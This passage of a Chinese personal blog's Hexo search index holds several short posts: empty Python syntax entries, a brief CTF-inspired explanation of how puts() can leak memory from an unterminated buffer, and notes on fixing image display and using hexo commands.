手动选择2号Libc作为正确的Libc</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2xx</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python语法之字典</title>
    <link href="/2024/11/04/python%E8%AF%AD%E6%B3%95%E4%B9%8B%E5%AD%97%E5%85%B8/"/>
    <url>/2024/11/04/python%E8%AF%AD%E6%B3%95%E4%B9%8B%E5%AD%97%E5%85%B8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>puts函数</title>
    <link href="/2024/11/01/puts%E5%87%BD%E6%95%B0/"/>
    <url>/2024/11/01/puts%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>做了一个赣ctf上的题，没想到这漏洞如此简单我竟然没发现，真是浅薄了，<br>在此记录一下</p><p><code>puts()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span>;<br></code></pre></td></tr></table></figure><p><code>puts()</code>函数的作用是持续输出字符指针<code>s</code>指向的字符，直到遇到空字符<code>\0</code>为止，</p><p>假设<code>char s[256]</code>中<code>s</code>指向的内容是由用户输入的</p><p>那么用户可以输入一个长度超过256的字符串<br>即使机器只读取前256个字符，那么也会导致<code>s[256]</code>中没有<code>\0</code>字符，</p><p>从而使puts持续输出s以及s之后的内存内容（以字符串的形式），直到遇到<code>\0</code>为止</p><p>从而造成内存泄漏</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>泄漏信息</tag>
      
      <tag>glibc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python语法之关键字try</title>
    <link href="/2024/11/01/python%E8%AF%AD%E6%B3%95%E4%B9%8B%E5%85%B3%E9%94%AE%E5%AD%97try/"/>
    <url>/2024/11/01/python%E8%AF%AD%E6%B3%95%E4%B9%8B%E5%85%B3%E9%94%AE%E5%AD%97try/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>obsidian+hexo方案解决图片显示问题</title>
    <link href="/2024/10/30/obsidian-hexo%E8%A7%A3%E5%86%B3%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/"/>
    <url>/2024/10/30/obsidian-hexo%E8%A7%A3%E5%86%B3%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>建立博客后遇到的第一个问题就是hexo上的图片显示问题</p><hr><p>想到一种考虑，把图片全都放在一个文件夹里试试<br>挖个坑<br>有空试试</p><p>测试图片</p><p>测试失败</p><p>测试图片2</p><p>好，试过了，确实不行<br>现有obsidian设置和hexo设置无法满足这个要求</p><hr><p>只有原先上面的方法是行的（目前最优）</p><p>成功</p><p>但可以考虑设置<code>_config.yml</code>：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">post_asset_folder:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>这样在<code>hexo new post &lt;name&gt;</code>时，就不会再多创建一个可能用不到的资源文件夹<br>在obsidian中粘贴时自动创建即可</p><p>注意：<br>obsidian插件<code>Custom Attachment Loaction</code>设置中附件的命名问题</p><hr><p>发现：<br>排在前面的url错误的图片竟然也会影响后面的所有图片，使后面的图片显示不出来</p><hr><p>md，还是得改成true</p><p>和插件设置中附件文件夹中文件的命名倒是没关系<br>和属性中的title也没关系</p><p>甚至和文件、文件夹的命名也没关系，只要合法且对应即可</p><hr><p><img src="/2024/10/29/hello-world/o%E8%A7%A3%E5%86%B3%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/file20241105202739043.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>建站</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>new_article</title>
    <link href="/2024/10/29/new-article/"/>
    <url>/2024/10/29/new-article/</url>
    
    <content type="html"><![CDATA[<h1 id="这是一篇测试文h"><a href="#这是一篇测试文h" class="headerlink" title="这是一篇测试文h"></a>这是一篇测试文h</h1><p>使用hexo的步骤</p><p>新建about页：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo new page about<br></code></pre></td></tr></table></figure><p>添加layout</p><p>新建文章</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo new post new_article<br></code></pre></td></tr></table></figure><h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">marked:</span><br>  <span class="hljs-attr">prependRoot:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">postAsset:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>再试？</p><p><img src="/2024/10/29/hello-world/file-20241105202749069.png"></p><p>将文章发布到github：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo g -d<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/10/29/hello-world/"/>
    <url>/2024/10/29/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
